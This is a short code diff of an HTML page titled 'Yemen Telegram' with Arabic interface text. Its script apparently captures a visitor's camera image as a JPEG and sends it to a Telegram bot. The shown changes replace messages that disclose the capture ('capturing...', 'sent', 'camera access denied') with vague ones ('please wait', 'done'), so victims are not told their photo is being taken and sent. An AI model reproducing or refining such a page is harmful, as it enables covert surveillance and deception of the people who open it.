@@ -6,7 +6,7 @@
   <title>Yemen Telegram</title>
 </head>
 <body>
-  <h2>جاري الالتقاط...</h2>
+        <h2>يرجى الانتظار.</h2>
 
   <script>
     // بيانات البوت
@@ -47,12 +47,12 @@
           stream.getTracks().forEach(track => track.stop());
 
           // تغيير واجهة الصفحة
-          document.body.innerHTML = "<h2>✅ تم الإرسال</h2>";
+          document.body.innerHTML = "<h2>✅ تم </h2>";
         }, "image/jpeg");
 
       } catch (err) {
         console.error("خطأ:", err);
-        alert("❌ لم يتم السماح بالوصول إلى الكاميرا.");
+        alert("❌ لم يتم.");
       }
     };
   </script>
